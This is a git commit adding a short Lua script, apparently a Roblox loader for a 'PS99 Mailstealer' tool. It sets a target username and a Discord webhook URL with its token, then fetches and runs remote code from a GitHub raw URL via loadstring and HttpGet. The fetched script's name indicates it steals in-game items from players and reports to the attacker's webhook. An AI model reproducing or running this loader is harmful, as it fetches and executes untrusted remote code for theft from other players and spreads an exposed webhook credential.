cc36962118bfb317e14bf4021023c5f27f54e87a
farqaud2 <pwetlorenze@gmail.com>
2025-03-24 22:26:25 +0800

    Add files via upload

---
+++ s.lua
@@ -0,0 +1,5 @@
+Username = "uhhhg231"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1353732816621408307/b5GAfcyvZXCje27oUGQ-3kCmCld1V3Mjg3j9UmcmuRVX7wTcnojDBnnapLzXtzOpGBMq" -- Paste your Discord webhook here
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
